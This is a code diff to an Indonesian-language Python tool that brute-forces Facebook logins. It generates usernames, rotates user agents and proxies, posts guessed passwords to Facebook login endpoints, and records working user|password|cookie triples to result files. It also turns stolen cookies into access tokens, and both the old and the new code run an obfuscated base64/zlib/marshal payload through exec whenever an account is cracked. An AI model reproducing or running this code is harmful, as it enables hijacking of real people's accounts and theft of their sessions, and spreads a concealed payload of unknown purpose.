@@ -636,12 +636,13 @@ Log Out Dari Akun (Keluar)"""
 			jumlah = int(input(f">--Limit--> "))
 			for z in range(jumlah):
 				x += 1
-				idd.append(f"{nama.replace(' ','')}"+str(x)+email+"<=>"+nama)
-				idd.append(f"{nama.replace(' ','')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
-				idd.append(f"{nama.replace(' ','_')}"+str(x)+email+"<=>"+nama)
-				idd.append(f"{nama.replace(' ','.')}"+str(x)+email+"<=>"+nama)
-				idd.append(f"{nama.replace(' ','_')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
-				idd.append(f"{nama.replace(' ','.')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
+				idd.append(nama+str(x)+email+"<=>"+nama)
+#				idd.append(f"{nama.replace(' ','')}"+str(x)+email+"<=>"+nama)
+#				idd.append(f"{nama.replace(' ','')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
+#				idd.append(f"{nama.replace(' ','_')}"+str(x)+email+"<=>"+nama)
+#				idd.append(f"{nama.replace(' ','.')}"+str(x)+email+"<=>"+nama)
+#				idd.append(f"{nama.replace(' ','_')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
+#				idd.append(f"{nama.replace(' ','.')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
 		elif ask in["2"]:
 			email = "@yahoo.com"
 			nama = input(f">--Masukan Nama--> ")
@@ -1458,12 +1459,21 @@ class crack_new:
 			ua = babas[str(rr(1,5))]
 		elif "ke3" == method:
 			babas = {
-				"1":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
-				"2":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/227.0.0.5.115;]",
-				"3":"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]",
-				"4":"Mozilla/5.0 (Linux; Android 9; Mi 9T Pro Build/PKQ1.181121.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/259.0.0.36.115;]"
+				"1":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"2":"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.6; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"3":"Mozilla/5.0 (X11; Linux i686; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"4":"Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"5":"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"6":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"7":"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
+				"8":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
+				"9":"Mozilla/5.0 (Mobile; LYF/F90M/LYF_F90M_000-03-19-240319; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
+				"10":"Mozilla/5.0 (Mobile; LYF/F101K/LYF-F101K-000-01-33-120318;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0",
+				"11":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
+
+
 			}
-			ua = babas[str(rr(1,4))]
+			ua = babas[str(rr(1,11))]
 		return ua
 	def prox_(self):
 		prox = open("data/prox_socks5.txt","r").read().splitlines()
@@ -1502,69 +1512,30 @@ class crack_new:
 					head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
 					bz = session.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
 				elif "ke3" == method:
-					data={}
-					session.headers.update({"Host": "m.facebook.com:443",
-"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-"pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
-"sec-ch-prefers-color-scheme": "light",
-"sec-ch-ua":'"Chromium";v="105", "Not)A;Brand";v="8"',
-"sec-ch-ua-mobile": "?1",
-"sec-ch-ua-platform":'"Android"',
-"Upgrade-Insecure-Requests": "1",
-"User-Agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"})
-
-					soup = par(session.get("https://"+url+"/login/save-device/?login_source=login").text,"html.parser")
-					link = soup.find("form",{"method":"post"})
-					lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
-					for __data in soup.find_all("input"):
-						if __data.get("name") in lsd:
-							data.update({__data.get("name"):__data.get("value")})
-						data.update({"email":user,"pass":pw})
-					response = session.post("https://"+url+link.get("action"),data=data)
+					header3={"Host": "m.facebook.com",
+					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+					"pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
+					"sec-ch-prefers-color-scheme": "light",
+					"sec-ch-ua": '"Chromium";v="105", "Not)A;Brand";v="8"',
+					"sec-ch-ua-mobile": "?1",
+					"sec-ch-ua-platform": '"Android"',
+					"Upgrade-Insecure-Requests": "1",
+					"User-Agent":ua}
+					link = session.get(f"https://{url}/login/?source=auth_switcher")
+					date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":user,"pass":pw,"next":"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"}
+					bx = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=header3, data=date)
 				if 'c_user'+yyy in session.cookies.get_dict():
-					play_mpv(".Wiii.mp3");print(url);print(ua)
-					try:
-						# Info: coding *GET INGFO UA* buatan anggaxd
-						url_main = "https://www.whatsmyua.info"
-						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
-						raw_ua = s.find("li", id="rawUa").text
-						family = s.find("li", id="family").text
-						name_hp = s.find("li", id="product").text
-						os_ = s.find("li", id="os").text
-						ly = s.find("li", id="layout").text
-						ua = raw_ua.replace("rawUa: ", "")
-						browser = family.replace("family: ", "")
-						hp = name_hp.replace("product: ", "")
-						os = os_.replace("os: ", "")
-						layout = ly.replace("layout: ", "")
-					except:pass
-					coki = ubah_cok(session.cookies.get_dict());user = re.findall('c_user=(.*);xs', coki)[0];wrt = '%s|%s|%s' % (user,pw,coki);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]));ok.append(wrt);open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
-					if "IYA" in apk_me:
-						ubah_bahasa(coki)
-						get_apk(user,pw,coki)
+					play_mpv(".Wiii.mp3")
+					coki = ubah_cok(session.cookies.get_dict())
+					user = re.findall('c_user=(.*);xs', coki)[0]
+					wrt = '%s|%s|%s' % (user,pw,coki)
+					if wrt in ok:pass
 					else:
-						try:
-							ok_ = Tree("                                 ",highlight=True, hide_root=True)
-							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
-							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
-							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
-							ok___ = ok__.add(f"{b}COOKIES{q}")
-							ok___.add(f"{c}{coki}{q}")
-							ok___ = ok__.add(f"{k}Link App{q}")
-							ok____= ok___.add(f"{c}{link_app}{q}")
-							ok___ = ok__.add(f"{k}UserAgent{q}")
-							ok____= ok___.add(f"{c}{ua}{q}")
-							ok_____= ok____.add(f"{k}Information UserAgent{q}")
-							ok______= ok_____.add(f"{b}OS{q}")
-							ok______.add(f"{c}{os}{q}")
-							ok______= ok_____.add(f"{b}LAYOUT{q}")
-							ok______.add(f"{c}{layout}{q}")
-							ok______= ok_____.add(f"{b}DEVICE HP{q}")
-							ok______.add(f"{c}{hp}{q}")
-							ok______= ok_____.add(f"{b}Jenis Browser{q}")
-							ok______.add(f"{c}{browser}{q}")
-							prints(ok__)
-						except:
+						ok.append(wrt);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]));open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
+						if "IYA" in apk_me:
+							ubah_bahasa(coki)
+							get_apk(user,pw,coki)
+						else:
 							ok_ = Tree("                                 ",highlight=True, hide_root=True)
 							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
 							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
@@ -1574,25 +1545,11 @@ class crack_new:
 							ok___ = ok__.add(f"{k}UserAgent{q}")
 							ok___.add(f"{c}{ua}{q}")
 							prints(ok__)
-					self.Kontol_Kau_Ikuti(session,coki)
+						self.Kontol_Kau_Ikuti(session,coki)
 					break
 				elif 'checkpoint'+yyy in session.cookies.get_dict():
-					play_mpv(".Wiii.mp3");print(url)
-					try:
-						# Info: coding *GET INGFO UA* buatan anggaxd
-						url_main = "https://www.whatsmyua.info"
-						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
-						raw_ua = s.find("li", id="rawUa").text
-						family = s.find("li", id="family").text
-						name_hp = s.find("li", id="product").text
-						os_ = s.find("li", id="os").text
-						ly = s.find("li", id="layout").text
-						ua = raw_ua.replace("rawUa: ", "")
-						browser = family.replace("family: ", "")
-						hp = name_hp.replace("product: ", "")
-						os = os_.replace("os: ", "")
-						layout = ly.replace("layout: ", "")
-					except:pass
+					play_mpv(".Wiii.mp3")
+					user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 					try:
 						yz  = requests.Session().get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tiktok),cookies=puput)
 						zxc = json.loads(yz.text)
@@ -1615,47 +1572,19 @@ class crack_new:
 							cp___.add(f"{m}{ttl}{q}")
 							prints(cp__)
 					else:
-						try:
-							cp_ = Tree("                                 ",highlight=True, hide_root=True)
-							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
-							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
-							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
-							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
-							cp___.add(f"{m}{ttl}{q}")
-							cp___ = cp__.add(f"{k}UserAgent{q}")
-							cp____= cp___.add(f"{c}{ua}{q}")
-							cp_____= cp____.add(f"{k}Information UserAgent{q}")
-							cp______= cp_____.add(f"{b}OS{q}")
-							cp______.add(f"{c}{os}{q}")
-							cp______= cp_____.add(f"{b}LAYOUT{q}")
-							cp______.add(f"{c}{layout}{q}")
-							cp______= cp_____.add(f"{b}DEVICE HP{q}")
-							cp______.add(f"{c}{hp}{q}")
-							cp______= cp_____.add(f"{b}Jenis Browser{q}")
-							cp______.add(f"{c}{browser}{q}")
-							prints(cp__)
-						except:
-							cp_ = Tree("                                 ",highlight=True, hide_root=True)
-							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
-							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
-							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
-							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
-							cp___.add(f"{m}{ttl}{q}")
-							cp___ = cp__.add(f"{k}UserAgent{q}")
-							cp___.add(f"{c}{ua}{q}")
-							prints(cp__)
+						cp_ = Tree("                                 ",highlight=True, hide_root=True)
+						cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
+						cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
+						cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
+						cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
+						cp___.add(f"{m}{ttl}{q}")
+						cp___ = cp__.add(f"{k}UserAgent{q}")
+						cp___.add(f"{c}{ua}{q}")
+						prints(cp__)
 					break
 				else:continue
-			try:
-				if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
-					anim.update(anim2,description=f"{q}[{m}SPAM{q}]")
-					anim.advance(anim2)
-				else:
-					anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
-					anim.advance(anim2)
-			except:
-				anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
-				anim.advance(anim2)
+			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
+			anim.advance(anim2)
 #		except Exception as e:print(e)
 		except:
 			loop-=1
@@ -2164,6 +2093,7 @@ def free_cookies():
 			os.sys.exit();break
 		except Exception as e:
 			kotak("# COOKIES ERROR !!!",M,Q)
+			continue
 
 def login():
 	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
@@ -2275,14 +2205,13 @@ class convert_token:
 			find = re.findall('act=(.*?)&nav_source', respon.text)
 			if len(find) == 0:
 				kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAB",M,Q)
-				os.sys.exit()
+#				os.sys.exit()
 			else:
 				for y in find:
 					response = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={y}&nav_source=no_referrer', headers = headers)
 					token = re.search('(EAAB\w+)', response.text).group(1)
 					open("data/login.txt", "w").write(token)
 				open("data/cookie.txt", "w").write(kukis_);bot_facebook()
-		os.sys.exit()
 
 
 
@@ -2460,7 +2389,7 @@ class Main_:
 	def _no_vpn(self):
 #		try:
 		folder();open_role()
-		self.__check_update_("2.5")
+		self.__check_update_("2.6")
 		self.__check_status_("aktif")
 		get_proxy_socks4()
 		get_proxy_socks5()
